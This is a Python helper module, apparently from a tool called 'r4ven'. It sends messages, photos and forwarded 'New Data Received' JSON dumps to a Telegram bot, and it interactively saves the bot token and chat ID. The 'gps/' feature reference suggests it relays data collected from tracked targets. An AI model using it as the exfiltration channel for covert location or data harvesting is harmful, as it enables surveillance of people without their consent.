#!/usr/bin/env python3
# utils.py
import os
import json
import requests
import logging
import time
import sys

# Logging (si l'app n'a déjà pas configuré logging, on configure un logger minimal)
logging.basicConfig(filename='r4ven.log', level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Colors si terminal interactif
if sys.stdout.isatty():
    R = '\033[31m'; G = '\033[32m'; C = '\033[36m'
    W = '\033[0m';  Y = '\033[33m'; M = '\033[35m'; B = '\033[34m'
else:
    R = G = C = W = Y = M = B = ''

# Nom du fichier de config Telegram (placé dans le dossier de travail de la "feature", ex: gps/)
TELEGRAM_CONFIG_FILE = "telegram_config.json"

# Signature ajoutée automatiquement aux messages/photos
SIGNATURE = "\n\n👾 by trhacknon 🕶️"

# ---------------------------
# Utilitaires fichiers
# ---------------------------
def get_file_data(file_path):
    """
    Lire le contenu d'un fichier texte et le retourner.
    """
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        return f.read()

# ---------------------------
# Telegram helpers
# ---------------------------
def _telegram_api_url(token, method):
    return f"https://api.telegram.org/bot{token}/{method}"

def send_telegram_message(token, chat_id, text, timeout=10):
    """
    Envoie un message texte via l'API Telegram.
    Retourne le JSON de réponse ou None en cas d'erreur.
    """
    url = _telegram_api_url(token, "sendMessage")
    payload = {'chat_id': chat_id, 'text': text + SIGNATURE, 'parse_mode': 'HTML'}
    try:
        r = requests.post(url, data=payload, timeout=timeout)
        r.raise_for_status()
        resp = r.json()
        if not resp.get("ok"):
            logger.error("Telegram sendMessage returned not ok: %s", resp)
            print(f"{R}[!] Telegram sendMessage error: {resp}{W}")
            return None
        return resp
    except requests.RequestException as e:
        logger.exception("Network error in send_telegram_message")
        print(f"{R}[!] Network error sending Telegram message: {e}{W}")
        return None
    except ValueError:
        logger.exception("Invalid JSON response from Telegram in send_telegram_message")
        print(f"{R}[!] Invalid response from Telegram.{W}")
        return None

def send_telegram_photo(token, chat_id, photo_path, caption=None, max_retries=2, timeout=30):
    """
    Envoie une photo via sendPhoto. Si échec (HTTP error, size, type...), tente sendDocument en fallback.
    Retourne la réponse JSON ou None.
    """
    if not os.path.exists(photo_path):
        logger.error("Photo not found: %s", photo_path)
        print(f"{R}[!] Photo file not found: {photo_path}{W}")
        return None

    caption_text = (caption or "") + SIGNATURE
    send_photo_url = _telegram_api_url(token, "sendPhoto")
    send_doc_url = _telegram_api_url(token, "sendDocument")

    for attempt in range(1, max_retries + 1):
        try:
            with open(photo_path, "rb") as f:
                files = {"photo": f}
                data = {"chat_id": chat_id, "caption": caption_text, "parse_mode": "HTML"}
                r = requests.post(send_photo_url, files=files, data=data, timeout=timeout)
            # si erreur HTTP -> fallback
            if r.status_code != 200:
                logger.warning("sendPhoto returned status %s: %s", r.status_code, r.text)
                print(f"{Y}[!] sendPhoto failed status {r.status_code}. Trying sendDocument...{W}")
                # fallback to sendDocument
                with open(photo_path, "rb") as f2:
                    files2 = {"document": f2}
                    data2 = {"chat_id": chat_id, "caption": caption_text, "parse_mode": "HTML"}
                    r2 = requests.post(send_doc_url, files=files2, data=data2, timeout=timeout)
                    if r2.status_code == 200:
                        try:
                            return r2.json()
                        except ValueError:
                            logger.exception("Invalid JSON in sendDocument response")
                            return None
                    else:
                        logger.error("sendDocument also failed %s: %s", r2.status_code, r2.text)
                        # will retry if attempts left
            else:
                try:
                    return r.json()
                except ValueError:
                    logger.exception("Invalid JSON in sendPhoto response")
                    return None

        except requests.RequestException as e:
            logger.exception("Network error when sending photo (attempt %s)", attempt)
            print(f"{R}[!] Network error sending photo (attempt {attempt}): {e}{W}")
        except Exception as e:
            logger.exception("Unexpected error when sending photo (attempt %s)", attempt)
            print(f"{R}[!] Unexpected error sending photo (attempt {attempt}): {e}{W}")

        # backoff before retry
        if attempt < max_retries:
            time.sleep(1 + attempt)

    logger.error("All attempts to send photo failed for %s", photo_path)
    return None

# ---------------------------
# Compat wrapper for previous code
# ---------------------------
def update_webhook(webhook, webhook_data: dict):
    """
    Compatibilité avec le code existant : si webhook est un dict {token, chat_id} on envoie via Telegram.
    webhook_data est converti en JSON lisible et envoyé.
    """
    if isinstance(webhook, dict):
        token = webhook.get("token")
        chat_id = webhook.get("chat_id")
        if not token or not chat_id:
            logger.error("update_webhook: invalid telegram config dict: %s", webhook)
            print(f"{R}[!] Invalid telegram config provided to update_webhook{W}")
            return

        # format payload nicely
        try:
            body = json.dumps(webhook_data, indent=2, ensure_ascii=False)
        except Exception:
            body = str(webhook_data)

        message = f"📡 <b>New Data Received</b>\n\n<pre>{body}</pre>"
        send_telegram_message(token, chat_id, message)
    else:
        # If older code passes a string, log & ignore (we migrated to Telegram)
        logger.warning("update_webhook called with non-dict webhook: %s", type(webhook))
        print(f"{Y}[!] update_webhook: provided webhook is not telegram config dict. Ignored.{W}")

# ---------------------------
# Interactive config management
# ---------------------------
def check_and_get_webhook_url(folder_name):
    """
    Vérifie l'existence du fichier telegram_config.json dans folder_name.
    Si absent ou invalide, demande interactivement token & chat_id et sauvegarde.
    Retourne un dict: {"token": "...", "chat_id": "..."}
    """
    config_path = os.path.join(folder_name, TELEGRAM_CONFIG_FILE)

    def prompt_config():
        print(f"\n{B}[+] {C}Enter your Telegram bot token (from @BotFather):{W}")
        token = input("> ").strip()
        # quick token sanity check
        if not token or ":" not in token:
            print(f"{R}[!] Token seems invalid. It should look like 123456:ABC-DEF...{W}")

        print(f"\n{B}[+] {C}Enter your Telegram chat ID or channel username (e.g. 987654321 or @channelname):{W}")
        chat_id = input("> ").strip()
        config = {"token": token, "chat_id": chat_id}
        # try to verify token quickly by calling getMe
        try:
            resp = requests.get(_telegram_api_url(token, "getMe"), timeout=8)
            if resp.status_code == 200 and resp.json().get("ok"):
                bot_info = resp.json().get("result", {})
                print(f"{G}[✓] Token validated for bot: {bot_info.get('username')} (id {bot_info.get('id')}){W}")
            else:
                print(f"{Y}[!] Warning: token validation failed (getMe). Telegram may reject token or you have no network.{W}")
                logger.warning("Token validation warning: %s", resp.text if 'resp' in locals() else "no response")
        except Exception as e:
            print(f"{Y}[!] Warning: could not validate token now: {e}{W}")
            logger.exception("Exception while validating token in prompt_config")

        # Save config
        try:
            with open(config_path, "w", encoding="utf-8") as f:
                json.dump(config, f, ensure_ascii=False, indent=2)
            print(f"{G}[✓] Telegram configuration saved to {config_path}{W}")
            return config
        except Exception as e:
            logger.exception("Failed to write telegram config to %s", config_path)
            print(f"{R}[!] Failed to save config file: {e}{W}")
            return config  # still return config so caller can continue

    # If file not present -> prompt and create
    if not os.path.exists(config_path):
        return prompt_config()

    # If file present -> load & validate shape
    try:
        with open(config_path, "r", encoding="utf-8") as f:
            cfg = json.load(f)
        if isinstance(cfg, dict) and "token" in cfg and "chat_id" in cfg:
            # optional quick validation of token
            token = cfg.get("token")
            try:
                resp = requests.get(_telegram_api_url(token, "getMe"), timeout=6)
                if resp.status_code == 200 and resp.json().get("ok"):
                    return cfg
                else:
                    print(f"{Y}[!] Saved token seems invalid or unreachable. Reconfigure now.{W}")
                    return prompt_config()
            except Exception:
                # network issues: still return cfg but warn
                logger.warning("Could not validate token due to network issue; returning saved config")
                return cfg
        else:
            print(f"{R}[!] Invalid telegram config file format. Reconfigure now.{W}")
            return prompt_config()
    except Exception as e:
        logger.exception("Failed to read telegram config file %s", config_path)
        print(f"{R}[!] Error reading config file: {e}{W}")
        return prompt_config()
